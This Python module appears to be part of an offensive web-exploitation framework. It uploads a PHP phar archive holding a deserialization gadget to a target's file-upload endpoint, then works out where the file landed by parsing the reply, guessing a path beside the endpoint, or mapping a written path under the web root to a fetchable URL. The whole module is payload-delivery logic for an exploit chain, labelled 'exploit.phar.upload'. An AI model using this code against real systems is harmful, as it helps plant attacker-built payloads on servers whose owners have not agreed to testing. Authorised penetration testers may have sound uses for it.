"""Putting a file on the target, and working out where it landed.

An archive that is not on the target is not a payload. Requiring the operator to
upload it by hand means the chain is only half a tool: the interesting part of a
phar is the gadget inside it, and that has to be built per run, per target, with
a marker that is fresh - which is not something anybody wants to do by hand.

Uploading is the easy half. The half worth writing down is finding out where the
file went, because an upload endpoint answers in whatever way its author chose:
it may name the path, echo the filename, or say nothing at all. All three are
handled, in that order, and the answer carries which one it was - a path the
target stated is a different thing from a path we assumed, and the difference
matters when the assumption is wrong.
"""

from __future__ import annotations

import re
import secrets
from dataclasses import dataclass
from urllib.parse import urljoin, urlsplit

from ..core.forms import FilePart, encode_multipart
from ..core.httpmsg import Request

# What an upload endpoint says when it is telling you where the file went.
_STORED = re.compile(
    r"(?:stored|saved|uploaded|written|created|success)[^\n]{0,40}?"
    r"([A-Za-z0-9_./-]+\.[A-Za-z0-9]{1,8})",
    re.I,
)

# A path that looks like it is under a web root, named anywhere in the reply.
_PATHLIKE = re.compile(r"(/(?:[A-Za-z0-9_.-]+/)*[A-Za-z0-9_.-]+\.[A-Za-z0-9]{1,8})")


@dataclass
class Uploaded:
    """Where the file ended up, and how that was decided."""

    filename: str = ""
    # The path as the target gave it, when it gave one.
    stated: str = ""
    # The path assumed from the endpoint's own directory, when it did not.
    assumed: str = ""
    response: str = ""

    @property
    def path(self) -> str:
        return self.stated or self.assumed

    @property
    def landed(self) -> bool:
        return bool(self.path)

    def describe(self) -> str:
        if not self.landed:
            return "the upload endpoint did not say where the file went"
        if self.stated:
            return f"the target says the file is at {self.stated}"
        return f"the file is assumed to be at {self.assumed}, next to the endpoint that took it"


def find_stored_path(body: str, filename: str) -> str:
    """The path an upload endpoint stated, when it stated one.

    Two shapes, and the second is the fallback: a sentence naming the file, and
    failing that a bare path to it anywhere in the reply. Both are checked
    against the filename, because a path to something else is not an answer.
    """
    if not body:
        return ""
    match = _STORED.search(body)
    if match and filename in match.group(1):
        return match.group(1).strip()
    for candidate in _PATHLIKE.findall(body):
        if filename in candidate:
            return candidate.strip()
    return ""


def assumed_path(endpoint: str, filename: str) -> str:
    """Where an upload lands when nothing says otherwise: beside the endpoint.

    An endpoint at `/upload.php` writes into its own directory on every
    implementation that does not go out of its way, so `/uploaded.phar` is the
    path. It is an assumption, and it is reported as one - but it is a better
    first guess than nothing, and it costs one request to find out it was wrong.
    """
    parts = urlsplit(endpoint)
    directory = parts.path.rsplit("/", 1)[0] if "/" in parts.path else ""
    return f"{directory}/{filename}" if directory else f"/{filename}"


def build_upload(
    endpoint: str,
    field: str,
    filename: str,
    content: bytes,
    content_type: str = "application/octet-stream",
    extra: list[tuple[str, str]] | None = None,
) -> Request:
    """The request that sends one file to a form, as a browser would send it."""
    boundary = "----ik" + secrets.token_hex(8)
    body = encode_multipart(
        list(extra or []),
        boundary,
        files=[FilePart(field=field, filename=filename, content=content, content_type=content_type)],
    )
    request = Request.from_url(endpoint, method="POST", body=body)
    request.headers.set("Content-Type", f"multipart/form-data; boundary={boundary}")
    request.headers.set("Content-Length", str(len(body)))
    request.label = f"upload {filename} to {field}"
    return request


def upload(
    ctx,
    endpoint: str,
    content: bytes,
    filename: str,
    field: str = "file",
    content_type: str = "application/octet-stream",
) -> Uploaded:
    """Send the file and work out where it went.

    The reply is read for a stated path first. When there is none the file is
    assumed to be beside the endpoint, and that assumption is carried in the
    result rather than hidden - a chain that reports a path it guessed as though
    the target had confirmed it is one that lies when the guess is wrong.
    """
    request = build_upload(endpoint, field, filename, content, content_type)
    exchange = ctx.send(request, action="exploit.phar.upload")
    body = exchange.response.text

    stated = find_stored_path(body, filename)
    landed = Uploaded(filename=filename, stated=stated, response=body[:400])
    if not stated:
        landed.assumed = assumed_path(endpoint, filename)
    return landed


def reachable_url(base: str, webroot: str, written: str) -> str:
    """The URL a written file is served from, given the web root it went into.

    The mapping is a subtraction, and getting it wrong is how a chain reports a
    file nobody can fetch. A file written to `/var/www/html/uploads/x.txt` under
    a web root of `/var/www/html` is served at `/uploads/x.txt` - the part of the
    path that names the web root is exactly the part the URL does not carry.

    Empty when the file was not written under that root: it is then not served at
    all, and a URL built anyway would be one that 404s while the run called it
    proof.
    """
    written = (written or "").strip()
    webroot = (webroot or "").strip().rstrip("/")
    if not written or not webroot:
        return ""
    if not written.startswith(webroot):
        return ""
    relative = written[len(webroot):].lstrip("/")
    if not relative:
        return ""
    return urljoin(base.rstrip("/") + "/", relative)
